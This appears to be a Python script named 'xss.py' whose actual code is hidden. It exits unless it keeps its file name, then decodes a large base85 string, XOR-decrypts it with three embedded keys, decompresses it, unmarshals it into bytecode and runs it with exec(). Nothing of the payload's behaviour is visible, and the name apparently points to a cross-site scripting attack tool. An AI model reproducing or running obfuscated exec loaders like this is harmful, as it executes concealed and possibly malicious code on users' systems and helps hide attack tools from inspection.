# Protected by SPECTRA
import base64, marshal, zlib, os, sys
_EXP = "xss.py"
if os.path.basename(__file__) != _EXP:
    print("[!] JANGAN RENAME FILE INI!")
    sys.exit(1)
_K1 = bytes.fromhex("5da1ab8b6b91f2c5d2cd21e6f9bf7e615e1d2972584e2fe5d32f199c5682c45132a76d589ff9cde465848461f912327eb8b30e7a73e69dfe32dfea3d05125066")
_K2 = bytes.fromhex("059f78a1d5a1c9c4429a9cc1bf26392a096ed75dc693060b493f5848922716a86684a85b0aafef16adcb781d4dc1095b235300756adcba3dfa47b334bd5dd088")
_K3 = bytes.fromhex("8b06f2e069341baa66fd8a043d8136a3312bb1fc7a289de3ed4c9b373f9bd8b3fa5f1f78f0fcaac4d0f107937a841a6565305bca312345c07f9403d1a9fde304")
_S = """tKz)!j7U53U>#euq~1q|W!|m2c=Nc48O}P>+DeE6ZbaV}AB-uT69s#PLb`R;--w9*g~080gA?}&oy75X
MS4oSpw@qI)kl4fg7W>Yyr!2%q_H`w(F-$NuE8?{<-sS+f^<5&5%ACTZ3I*v2@Ea@k!-BGb6lSnLC#$D
b|~B0YKM5i;DhbBDKH5G04;8AM*6K8G}Md>Yi~O|&c&pyahRh}*vnUr7)6t6C_or=UAaTYWo^*y6DngS
(=H+5R|(*y7OI~j3mVDjx>)+tk@Z0hdR$lIwm!#7u>8#XGb+9|H~zq{$yXwf_W)28CCOpayxd(_##3Md
)W{-M)_g6?_R5DFj0iF420$;@gyB>nw?rBUnsmGQuel5RU%PW~3*0;?y3OL$<VL@P)@r?BmEdh~_dfTc
AgT>wvG&5nJpeLWIV$I3ZSq<JsAv4~;}(6!%9rv#1YbZhL9YR64Xs&SWz9CllaW{H!w{%4{y=d{ZSeDc
Eh%35hhRk3(eK80SF2Ra^Z7TqZ{jBy{enqpMTs3<(`h)Z%VQsT%2a@AeoAM`r90W_?Kiw)<-A+*H1AIX
o?iMi;q9A<8RSvy$7~&u#pxTlx8eF#ZT0A^xNg)GsRH=EqV?=CRu4d+rRd2SCg=mdt$KKX9HpW*_={E)
I&qpvwKl!_?v#{=t$0WA;L140dE$}E^m=Kp%Mc>=HvB6RM57{na>K^Xnhyvo`d|}fqF*U<JexGX6|?0b
*%t^OvxW1S&=MNu{tOAt^T{odakT&nju3{gM#@Th?+urk(yl7T1_3sNAnQ@=4~o#kZ2Z9N5-qBgcgf(^
U>PW(f=T7Ml*R-*n?J&fr|sKkAq9m<J9%*l?IWe82>DS71K-19(2wf<jJxz<72SUaHEHp~2ws=VO+M0y
H~bH5a^2Lq$a93yNYqo)YgQE7yOeDRftbs^C!lLwJP&iyuX$YWW5}U2jkx%0+vcUmO@FlQtRPd~Z0qEO
aeQpf)pYXVsMgLZ6!8yH%C!h&%S-6@EfxNc2)A?;=g};H8y55t3H2qX19(p!3Mqb3PghDTot$(JmSo31
1<WVqnnz+r$(0EcNo0SB0yrzT=oLAP#=Too2t8?OJNhuuVf;PoiQB$^Tc*(S-H9G`U{nOo@}Til=#p`-
fGt8q8s7l8U@h!lyj<N{tg;1$632*j-|z9OT4t`IaP{zkBR&dT!#eNmWz+_Z6fr!ZCFxeO(b|Gs1115C
p0Wf$!!K*-BO9M}v;F$nSW%FHr~-CD4cHbekT0aIWzxPPp$O)}F{=f8oH{znY&NxyI8kpgcZCE?jS@i#
GDTcq>YRG^Jz@rZYWm_r|GSHKOob>{0AMk*a)*YEH?_8cvlJ)#)o}`o=|Mzl)A|?@Mo34(nsGyWTI%=k
`0@gbqweP^U2MFSSdO9^*NXJJ=V=jE^>Ja;{vXHZh=e{}VvV8|(7>VE>Jxa;4$5(<db~rx{<rYCLTdIG
>G7nqt*ra*LE>5O3u=LZEy#N7%o9kP+v<+l9-8KDc1z^Rj0F`#r?iF>I0?;n)t8GTEB2BU*fR7-EEsI{
2fr>M^n>oO4NNR?MsDm$1ZUYn56jBT0-Lm{;IP+Hn>g0g6Yvta@;OtAcvu>ps^R-j8+N<N#TGU&TZB6o
>rLwiQ6Y)C#&+xHD5?Q7DG^bh|9smxSU+56*fVVayspzlL*kBm5rv?I>jnY-t(`o(KTavu|CW3;9E|p7
_aI!i+ovUO@~y@mv(Oub19*E4?)!9^VO(tlrO74tmtUNLd!|$=-~t?8H4qphAQOpp%#{@$=r`;5VU3do
Mfcit<2XJwNxctGatBNQkd;J<i~*t3w$NoHS_ci5fT-IDX$w3k!eK4y<T|OU+ytHqPt6h?DSbi#mk^l*
85e-o7nW1@9-u<DJaBgOPaW+0hR@l0&T6p#(BwkV?z^TTLddiGlO&@B_U95%Bqx;*HS;0<t6?9pVrGxQ
xt6kjiJPIC5F*Nq$kuDH+>C#8$ytSG4#|}*s2hbAVZQdgGEhe<u@^~cahcoafg7!H-ONczY?`H5awyfU
zA0AUh(r>E4+x$Axk9>D6m;YlvbbPVg(C*3HFQUFutt`&js@7^+2pVAXZ+Ja$wc@bioZFIQgLjLh;6OV
aRM5syh7CnWy%@jr%6(?U5Gt@;|Y%Kpc|K!&y;CV3`T5f5iq#>E<Haic-!{e!VyR{uU6Xz0-x>CUq-(g
I6|;EV6BF;!U<=pFD0d>E=P%eu*oMKwFRNF%eE1EyBYVx%%J2RL$_|_s9Ib}o09P3DL`dMxD%x!ZcTI)
W@YPek7X^~pXjS1MJu_C%Txx;X4m{Dl9wQ!cbcPu>fb^a{nTJZFS~NK-9&+DIxQBQW4%i7>I5a@o81^Q
Wy(qG>BO9y(m`)G>1h|U;+{P?=4M$2T9FmfAq$#=X55pZud5EZ-zO3(#^eC7kBGp#&eJf}rH>#R9e6K&
nN37T1kZP^F=fn1FVjafbz!61$-FM;l^KgxJ&149Js<NjHN(wf3Otcy#SLCUbA3P4SYrH-zNQCYg8av>
Rv%qa^JppBr->WnwJEcMMNJq!p<=`o>mV1KreZK({qbvN<hg4|lWKJMtk+CSRPmT<>uNa{!C2|~ee(&u
*X_9~pjSEW!z2ECSsMz}C93-WbYpMgC$*l5{FuH%=fu4-9U_&q+526Q^57A*7;=G5qnq)UR(V@Ac`Wh2
&;}@Aeq3Vz)itpgHbk?LH)`C5VUyEO3A?MdY6L?gZz4`EqDWfe%2LlG4H@ijR78ESIfj76I*%uEcl+}>
qw6r9%Fwkj<ZoW+4vbAp_jVpNz>6~`=u{6%{sqL}<mAsU@0L-YjgegqX@U@2xi*4tcX|gdjOw{|LriB>
c~?+zGOq1<IVS%ADj_yDfTAZc3Nd>ksmG;{2-)G#-46vKG{Hv+*P~8j66&|xH0R(u(&RnA2s@`i_yUTy
{jAo!$$clJN-1#t>KmRQ0i_UcS{kV|gObG7HrPl7L?$Jd4`ee7Ur;sdxv;SN2@r^WzvT}0XK`e&C|wUT
IKq52@cEyX1#%9fZiW2!8z{I?dkVl}lq-RJmm~kzk(A*Cy`6dPA-^eY)8f{BrfCW(R2Sc%4t(Tw>T{nL
D(4L@F%M>M`m{rDmBXs&i$Hg|+m2*&f$uXc;4#r<v&mg`zv<WDWe1HnFab|t5jko#bkRTf=xd#4NDUG{
5YGJ6&*6wxo<!OIyv7ZqA?EQukGfM1m?5=YP6O4JQOrBqjLZIs>HI}ft=OOUO%LLA_YbSILEv}iO-}T&
sM*{bC%Q+9DVxXBmY=2`+q<@9(?l(+!QgG=P=mKULtSN*d}O~vWLb_`8Y`yU@VC@N5vCK>P~a60IA&R}
i<_}w_G4eYRr<shkss)3Hl-tZ6Q95MzZ-{+$pGN}&j7ZeVFkA{zhoQw@P=_1wB3+;dc5Qz?YVx9<;<Bv
ePjWkVqyXbS(tTH=aSMA^?fqiUP4!^)CLJY@?BP<gFl>1;g~X=NY<6GWPuKDDMw$OaBklMCV0gOw7=UG
-)JWmiR^A4;hqC;y)c}rF<(Cjwj|q^8OecfY4aUWKPm`WF>xc`U=b{6dIDw5&ez$Evvym^vO`ssky)3L
kM0ZRuTM4+mxU@vL^@?y-!BF#)?L~}CvJ%G!NHOWoYH1*tE5zFRht>(5@18y)#o}ZM3LyT#j40*W1%T8
*+j(M&rF5J&Z{p1(phV}E9CP?XndX6&yw-@c^cP_{IvU7n{|UyYPW2F$53n9J`Ltziel7|tVF9OFh>LY
M*fJH86Y(Be7Z5WyLG6#|Iqu#fOVfzB`J&t<?`}p;6|l8pbl$TFqn8ZZ>(*O1{8x)pUxaN$a|y)(b3oi
T8jXc0F=8{OcT^%wkM<%AE3gJBMn=CcpFrSAu(W(LA8ahkylnu_@>kcJ4woS6O9_IP-gA-!rI1harBK)
&&4*qq-rXh6*njhW+BS<UE{rdVybU)7UQh|<fBC+`j?{>As@w-d&v|yk*(vsVSU=4muZgFF|+9REob0j
udg2Vd`A^bXh8PYbSmGySwqsLw+dwi_#5mjPwV#LY4$5x4{+g54A%S;LE^HoYM`R$5vc`kPyWGN+q(3%
`2R>(-sDy#O*hssK9S-Jup9=3_Lt^G(PWe%Y*82)1O7XMEU{4c6{6e>G)%%cyFrl<B)t?fSL(X%-+2-C
slK^dpL9H5w<J9UciUDPbWz;5&&U=vMWp-`gux2y*V=g#x|yqUt7^zhPuX#g5<?*d-;Ne74edi(77L(y
QfNCB67TWqCCad=><A`ru5IKoR+F4kp-@QsARg@p8_>M1q@l`mCJ;?M;%=O?tvsOa1Sp*<WvX~z+pf1Z
<q^!vUb6v|cJn=1@w)GGcfGUNR>}36c#S_Cy0b+Z4jj@dOLxDpmb`ZUhPl-cKa>UbiehLLHP%Z7M8b1k
)thffZ4~|RhPi`1s>Sr~<ZdlzZB==NX?3FOA-uEasu7(JJ_`$$6!^gA6w=9ad%o8*NTS~dT1)P4@s*47
UxsHI_CVX9_b53)51i49?yg#m!yT^`YI`!~zeyZyre+?KASl+9sCe(HMw~U?j*50`I?(P#GmJv@-Pou0
!#kw2T7+uqxxQITzY6sKna&B9Z7&8(i&)Y{i)|?+|D@AUe_MvL?{JbU<VW1aW|ommDOf=@H>7b;3qyVS
CcSJ&pHx^tt+1wri^d;=;vA_$(U&h_7905u`!B3O6=p9*JZO(B>B+lW+9`XqcHV?=t#E%LX$Y8&sSt9#
Qb;$f<0fPyuP2X%xT`Ne?qMyny4H4yFMJ+k4g8oy_vhqK8^zF<us9s&@tz>Qf#og~=l"""
_B = base64.b85decode(_S.replace("\n", "").encode("ascii"))
_D1 = bytes(b ^ _K3[i % len(_K3)] for i, b in enumerate(_B))
_D2 = bytes(b ^ _K2[i % len(_K2)] for i, b in enumerate(_D1))
_D3 = bytes(b ^ _K1[i % len(_K1)] for i, b in enumerate(_D2))
_Z = zlib.decompress(_D3)
_C = marshal.loads(_Z)
exec(_C)
